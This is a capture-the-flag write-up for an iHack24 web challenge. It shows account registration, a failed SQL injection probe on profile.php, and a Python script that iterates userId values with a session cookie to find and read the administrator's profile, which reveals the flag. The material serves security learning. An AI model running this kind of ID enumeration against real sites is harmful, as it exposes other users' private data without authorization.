# Writeup
1. First, I created a new account.
```
hiccbiuabcia:nkcuahsuda1
```

```HTTP
POST /register.php HTTP/1.1

name=hiccbiuabcia&email=hiccbiuabcia%40hiccbiuabcia.com&password=nkcuahsuda1&confirm_password=nkcuahsuda1
```
2. Let's login. ![[Pasted image 20240727100923.png]]
3. This website is running PHP because it has a PHPSESSID.
4. When I press my account,
```
GET /profile.php?userId=96 HTTP/1.1

Host: character-journey.ihack24.capturextheflag.io
...
Cookie: PHPSESSID=125573dc92b0eed280d2bf7c4e716f8b

Connection: close
```
- Hmm, can I access other people's User id?
5. When I press Support, it GETS `/support.php`
6. When I press feedback, it redirects me to `/feedback.php` !
7. Ok, `profile.php` is vulnerable at the `userId` parameter.
```http
GET /profile.php?userId=2 HTTP/1.1
```
8. Ok, I believe it is vulnerable to SQLi
```http
GET /profile.php?userId=1';-- HTTP/1.1
```
9.  I tried all kinds of SQL injection techniques but cant seem to work.
10. Let's bruteforce it
```python
import requests

URL = 'http://character-journey.ihack24.capturextheflag.io/profile.php'
index = 0

s= requests.Session()

for index in range(100):
    re = s.get(
        URL,
        params={
            'userId' : f'{index}',
        },
        cookies= {'PHPSESSID':'125573dc92b0eed280d2bf7c4e716f8b'},
        proxies = {
            'http' : 'http://127.0.0.1:8080', # Specify HTTPS proxy and send it through a certain port
        },
        verify= False, # Trust Burpsuite's self signed CA certificate
    )
    # print(re.text)
    if(not re.text.__contains__('User not found')):
        target = re.text.split('<p>Email: ')[1].split('</p>')[0].strip()
        print(f'[{index}] {target}',flush=True)
        if re.text.__contains__('administrator@google.com'): 
            print('FOUND TARGET!',flush=True)
            break


```
Output:
```
...
[52] zDjkv@test.com
[53] administrator@google.com
FOUND TARGET!
```
- Alright, found the target!
11. Let's request the ID of the target.
```http
GET /profile.php?userId=53 HTTP/1.1
Host: character-journey.ihack24.capturextheflag.io

...

Cookie: PHPSESSID=125573dc92b0eed280d2bf7c4e716f8b
```
Output:
```
       <p>Name: ihack24{655b7b7ae4c62d726a568eff8914573e}</p>
```